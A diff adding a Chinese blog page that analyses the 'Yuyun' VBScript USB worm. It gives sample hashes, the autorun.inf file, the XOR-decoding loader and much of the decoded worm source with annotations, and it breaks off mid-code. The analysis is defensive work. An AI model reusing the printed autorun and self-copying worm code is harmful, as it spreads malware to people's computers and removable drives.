@@ -1,0 +1,514 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="背景捕获到一个纯vbs脚本病毒   包含一个autorun.inf文件和一个Thumb.db文件，两个文件均为隐藏的受保护的操作系统文件（只读）。 autorun.inf MD5:080d8ef2430b49f991b460abf4af5156 Thumb.db MD5:0a456ffff1d3fd522457c187ebcf41e4 autorun.infautorun.inf常见于可移动介质传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yuyun脚本蠕虫分析">
+<meta property="og:url" content="http://example.com/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Demo_博客">
+<meta property="og:description" content="背景捕获到一个纯vbs脚本病毒   包含一个autorun.inf文件和一个Thumb.db文件，两个文件均为隐藏的受保护的操作系统文件（只读）。 autorun.inf MD5:080d8ef2430b49f991b460abf4af5156 Thumb.db MD5:0a456ffff1d3fd522457c187ebcf41e4 autorun.infautorun.inf常见于可移动介质传">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/image-20220614134519359.png">
+<meta property="article:published_time" content="2022-06-14T05:22:06.000Z">
+<meta property="article:modified_time" content="2022-06-14T06:25:21.565Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="vbs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/image-20220614134519359.png">
+  
+  
+  <title>Yuyun脚本蠕虫分析 - Demo_博客</title>
+
+  <link  rel="stylesheet" href="https://unpkg.com/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://unpkg.com/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://unpkg.com/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Demo_博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/bbs/">
+                <i class="iconfont icon-notebook"></i>
+                留言板
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Yuyun脚本蠕虫分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-14 13:22" pubdate>
+        2022年6月14日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      12k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      99 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Yuyun脚本蠕虫分析</h1>
+            
+            <div class="markdown-body">
+              <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>捕获到一个纯vbs脚本病毒</p>
+<img src="image-20220614134519359.png" srcset="/img/loading.gif" lazyload alt="样本截图" style="zoom:50%;" />
+
+<p>包含一个autorun.inf文件和一个Thumb.db文件，两个文件均为隐藏的受保护的操作系统文件（只读）。</p>
+<p><strong>autorun.inf MD5:080d8ef2430b49f991b460abf4af5156</strong></p>
+<p><strong>Thumb.db MD5:0a456ffff1d3fd522457c187ebcf41e4</strong></p>
+<h2 id="autorun-inf"><a href="#autorun-inf" class="headerlink" title="autorun.inf"></a>autorun.inf</h2><p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/autorun.inf">autorun.inf</a>常见于可移动介质传播蠕虫病毒，其作用是允许在双击磁盘时自动运行指定的某个文件。</p>
+<p>注：在2011年2月8日发布的安全公告KB967940中，微软对Windows自动运行功能进行了最新升级，限定Windows XP、Windows Server 2003、Vista（Vista是到Win7的一个过渡系统）和Windows Server 2008平台上的自动运行功能仅支持CD和DVD媒体。当用户使用包含autorun.inf文件的USB设备、网络共享或其它非CD&#x2F;DVD媒体时，系统不会执行自动运行。</p>
+<p>autorun.inf 内容如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[autorun]</span><br><span class="hljs-attr">open</span>=WScript.exe //e:VBScript thumb.db auto<br>shell\<span class="hljs-attr">open</span>=Open<br>shell\open\<span class="hljs-attr">Command</span>=WScript.exe //e:VBScript thumb.db auto<br>shell\open\<span class="hljs-attr">Default</span>=<span class="hljs-number">1</span><br>shell\<span class="hljs-attr">explore</span>=Explore<br>shell\explore\<span class="hljs-attr">Command</span>=WScript.exe //e:VBScript thumb.db auto<br></code></pre></td></tr></table></figure>
+
+<p>即自动调用WScript.exe以VBS脚本来执行thumb.db文件，执行参数为auto</p>
+<p>由此可见，该样本应该属于蠕虫病毒，并且较老，传播能力一般</p>
+<h2 id="Thumb-db"><a href="#Thumb-db" class="headerlink" title="Thumb.db"></a>Thumb.db</h2><p>thumb.db为vbs脚本病毒，主要代码如下：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;www.muslimah.or.id;==================================== my name:Yuyun 1.0</span><br><br><span class="hljs-comment">&#x27; ============================</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Dim</span> fso, ws<br><span class="hljs-keyword">Set</span> fso = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">Set</span> ws = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.Shell&quot;</span>)<br><span class="hljs-keyword">Set</span> sh = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.application&quot;</span>)<br>Q=WScript.ScriptFullName           <span class="hljs-comment">&#x27;运行的脚本文件的完全路径</span><br>tmp=fso.GetSpecialFolder(<span class="hljs-number">2</span>)<br>tn=fso.GetTempName                 <span class="hljs-comment">&#x27;返回随机生成的临时文件或文件夹的名称</span><br>tmpt=tmp+<span class="hljs-string">&quot;\&quot;</span>+tn                    <span class="hljs-comment">&#x27;临时文件绝对路径</span><br><span class="hljs-keyword">Set</span> swt=WScript.Arguments          <span class="hljs-comment">&#x27;参数集合</span><br><span class="hljs-keyword">If</span> swt.Count&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br>	status=swt(<span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">If</span> status=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-keyword">Then</span><br>		sh.Explore <span class="hljs-built_in">Left</span>(WScript.ScriptFullName,<span class="hljs-number">3</span>)       <span class="hljs-comment">&#x27;参数是auto返回脚本文件所在盘符，如C:/</span><br>		<span class="hljs-keyword">Else</span> <br>		status=<span class="hljs-built_in">Left</span>(WScript.ScriptFullName,<span class="hljs-built_in">Len</span>(WScript.ScriptFullName)-<span class="hljs-built_in">Len</span>(WScript.ScriptName))+status     <span class="hljs-comment">&#x27;否则以参数为文件夹名</span><br>			<span class="hljs-keyword">If</span> fso.FolderExists(status) <span class="hljs-keyword">Then</span>    <span class="hljs-comment">&#x27;存在打开文件夹</span><br>				sh.Explore status             <br>			<span class="hljs-keyword">Else</span><br>				fso.CreateFolder status          <span class="hljs-comment">&#x27;不存在，创建打开文件夹</span><br>				sh.Explore status<br>			<span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>		<span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Else</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Set</span> QQ=fso.GetFile(Q)<br><span class="hljs-keyword">Set</span> Q1=QQ.OpenAsTextStream(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)    <span class="hljs-comment">&#x27;打开脚本文件，返回一个TextStream对象</span><br>isiQ=Q1.Read(QQ.Size)<br>Q1.close<br>t1=<span class="hljs-built_in">InStr</span>(<span class="hljs-number">1</span>,isiQ,<span class="hljs-string">&quot;Yuyun^_^~!~2008&quot;</span>+<span class="hljs-string">&quot; &gt;&gt;&gt;&quot;</span>,<span class="hljs-number">0</span>)+<span class="hljs-number">18</span>   <span class="hljs-comment">&#x27;在运行的脚本文件中查询指定字符串</span><br>isiQ=<span class="hljs-built_in">Right</span>(isiQ,<span class="hljs-built_in">Len</span>(isiQ)-t1)                    <span class="hljs-comment">&#x27;返回Yuyun^_^~!~2008 &gt;&gt;&gt;后的字符串</span><br>hsl=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">For</span> v=<span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-built_in">Len</span>(isiQ)                             <span class="hljs-comment">&#x27;解码得到的字符串</span><br>t=<span class="hljs-built_in">Asc</span>(<span class="hljs-built_in">Mid</span>(isiQ,v,<span class="hljs-number">1</span>))<br>hsl=hsl+<span class="hljs-built_in">Chr</span>(t <span class="hljs-keyword">Xor</span> <span class="hljs-number">7</span>)<br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">If</span> fso.FileExists(tmpt) <span class="hljs-keyword">Then</span> fso.GetFile(tmpt).Attributes=<span class="hljs-number">0</span><br><span class="hljs-keyword">Set</span> temporary=fso.OpenTextFile(tmpt,<span class="hljs-number">2</span>,<span class="hljs-literal">True</span>,<span class="hljs-number">0</span>)     <span class="hljs-comment">&#x27;打开生成的临时文件</span><br>temporary.Write hsl                               <span class="hljs-comment">&#x27;写入解码得到的字符串</span><br>temporary.Close<br>ws.Run <span class="hljs-string">&quot;WScript.exe //e:VBScript &quot;</span>+tmpt+<span class="hljs-string">&quot; &quot;&quot;&quot;</span>+Q+<span class="hljs-string">&quot;&quot;&quot;&quot;</span>         <span class="hljs-comment">&#x27;以VBScrip执行生成的tmp文件</span><br><br> <span class="hljs-comment">&#x27; Yuyun^_^~!~2008 &gt;&gt;&gt; :::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><br><br> <span class="hljs-comment">&#x27;J~&#x27;ifjb&#x27;=&#x27;^r~ri&#x27;Qbu&#x27;6)7</span><br><br> <span class="hljs-comment">&#x27;N&#x27;mrts&#x27;pfiif&#x27;tbb&#x27;bqbu~&#x27;`nuk&#x27;khhlt&#x27;indb+&#x27;ebssbu+&#x27;lnict&#x27;btwbdnfkk~&#x27;f&#x27;jhtkbj&#x27;`nuk</span><br><br> <span class="hljs-comment">&#x27;e~=&#x27;Fihi~jhrtb&#x27;ni&#x27;Mfsnj+&#x27;Ihqbjebu&#x27;577?</span><br><br> <span class="hljs-comment">&#x27;Pobi&#x27;N&#x27;ahric&#x27;ihsoni`&#x27;ebfrs~&#x27;bktb)))&#x27;fic&#x27;sobi&#x27;N&#x27;puhsb&#x27;sont&#x27;tdunws&#x27;ahu&#x27;fkk</span><br><br> :::::::::::::::::::::::::::::::::::::::::::::::::::::::<br> (以下省略)<br></code></pre></td></tr></table></figure>
+
+<p>可以看出代码的主要功能是，解码、释放并执行包含的经过混淆的vbs脚本文件</p>
+<p>生成的vbs文件，如下：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;=======================================================</span><br><span class="hljs-comment">&#x27; My name : Yuyun Ver 1.0</span><br><span class="hljs-comment">&#x27; I just wanna see every girl looks nice, better, kinds especially a moslem girl</span><br><span class="hljs-comment">&#x27; by: Anonymouse in Jatim, November 2008</span><br><span class="hljs-comment">&#x27; When I found nothing beauty else... and then I wrote this script for all</span><br><span class="hljs-comment">&#x27;=======================================================</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Dim</span> fso, ws, status,status1, fly<br><span class="hljs-keyword">Set</span> fso = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">Set</span> ws = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.Shell&quot;</span>)<br><span class="hljs-keyword">Set</span> sh = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.application&quot;</span>)<br><span class="hljs-keyword">Set</span> net = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.network&quot;</span>)<br>fly=<span class="hljs-literal">false</span><br>tmp=fso.GetSpecialFolder(<span class="hljs-number">2</span>)<br>tn=fso.GetTempName<br>tmpt=tmp+<span class="hljs-string">&quot;\&quot;</span>+tn<br>docx=ws.SpecialFolders(<span class="hljs-string">&quot;MyDocuments&quot;</span>)         <span class="hljs-comment">&#x27;我的文档文件夹</span><br><br><span class="hljs-keyword">Set</span> swt=WScript.Arguments<br><span class="hljs-keyword">If</span> swt.Count&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span>          <span class="hljs-comment">&#x27;存在参数，将参数赋值给status</span><br>	status=swt(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">if</span> fso.fileexists(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>) <span class="hljs-keyword">then</span><br>	<span class="hljs-keyword">set</span> ira=fso.getfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>)<br>	ira.attributes=<span class="hljs-number">0</span><br>	ira.name=<span class="hljs-string">&quot;shalihah.ira&quot;</span><br>	<span class="hljs-keyword">if</span> ira.name=<span class="hljs-string">&quot;shalihah.ira&quot;</span> <span class="hljs-keyword">then</span><br>	ira.name=<span class="hljs-string">&quot;Yuyun.Q&quot;</span><br>	<span class="hljs-keyword">set</span> ira=fso.opentextfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>	<span class="hljs-keyword">else</span><br>	fly=<span class="hljs-literal">true</span><br>	<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span><br>	<span class="hljs-keyword">set</span> ira=fso.opentextfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Set</span> AQ=fso.GetFile(status)      <span class="hljs-comment">&#x27;获取参数脚本文件</span><br><span class="hljs-keyword">If</span> fso.FileExists(tmpt) <span class="hljs-keyword">Then</span> fso.GetFile(tmpt).Attributes=<span class="hljs-number">0</span><br>AQ.Copy tmpt,<span class="hljs-literal">True</span>               <span class="hljs-comment">&#x27;复制参数脚本文件到临时文件</span><br><span class="hljs-keyword">Set</span> AQ=fso.GetFile(tmpt)<br>AQ.Attributes=<span class="hljs-number">39</span>               <span class="hljs-comment">&#x27;39=32+4+2+1,即存档文件+系统文件+隐藏文件+只读文件</span><br>anv=tmp+<span class="hljs-string">&quot;\auto.exe&quot;</span><br><span class="hljs-keyword">If</span> <span class="hljs-keyword">Not</span> fso.FileExists(anv) <span class="hljs-keyword">Then</span> AQ.Copy anv          <span class="hljs-comment">&#x27;复制重命名为auto.exe</span><br><span class="hljs-keyword">Set</span> auto=fso.GetFile(anv) <br>auto.attributes=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">Set</span> aut=fso.OpenTextFile(anv,<span class="hljs-number">2</span>,<span class="hljs-literal">True</span>,<span class="hljs-number">0</span>)                <span class="hljs-comment">&#x27;以Text打开auto.exe</span><br>isi=<span class="hljs-string">&quot;[autorun]&gt;open=WScript.exe //e:VBScript thumb.db auto&gt;shell\open=Open&gt;shell\open\Command=WScript.exe //e:VBScript thumb.db auto&gt;shell\open\Default=1&gt;shell\explore=Explore&gt;shell\explore\Command=WScript.exe //e:VBScript thumb.db auto&quot;</span><br>isi=<span class="hljs-built_in">Replace</span>(isi,<span class="hljs-string">&quot;&gt;&quot;</span>,vbCrLf)                           <span class="hljs-comment">&#x27;&gt;替换为回车</span><br>aut.Write isi                                         <span class="hljs-comment">&#x27;写入auto.exe</span><br>aut.Close<br>auto.Attributes=<span class="hljs-number">39</span><br><br>ltkc=sh.Name<span class="hljs-built_in">space</span>(&amp;H1c&amp;).Self.path + <span class="hljs-string">&quot;\Microsoft\CD Burning&quot;</span><br>AQ.Copy ltkc+<span class="hljs-string">&quot;\thumb.db&quot;</span>,<span class="hljs-literal">True</span><br>auto.Copy ltkc+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">If</span> fso.FileExists(docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>) <span class="hljs-keyword">Then</span> fso.GetFile(docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>).Attributes=<span class="hljs-number">0</span><br>AQ.Copy docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>,<span class="hljs-literal">True</span>                    <span class="hljs-comment">&#x27;原脚本文件复制到我的文档目录下，命名为database.mdb</span><br>regQ                                                  <span class="hljs-comment">&#x27;修改注册表</span><br><span class="hljs-keyword">Set</span> rara=UNISKA<br>Hertz <span class="hljs-literal">False</span><br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Day</span>(Now)&lt;&gt;<span class="hljs-number">3</span> <span class="hljs-keyword">Then</span> rekursif docx,<span class="hljs-number">1</span> <span class="hljs-keyword">Else</span> rekursif docx,<span class="hljs-number">3</span>    <span class="hljs-comment">&#x27;判断时间是不是3日</span><br><br><span class="hljs-keyword">call</span> attack_net<br>Hertz <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">Sub</span> rekursif(path,dp)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>dropf path<br>wscript.sleep <span class="hljs-number">50</span><br><span class="hljs-keyword">If</span> dp&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> fldr1 <span class="hljs-keyword">In</span> fso.GetFolder(path+<span class="hljs-string">&quot;\&quot;</span>).SubFolders<br>	rekursif fldr1.Path, dp<span class="hljs-number">-1</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> dropf(path)<br><span 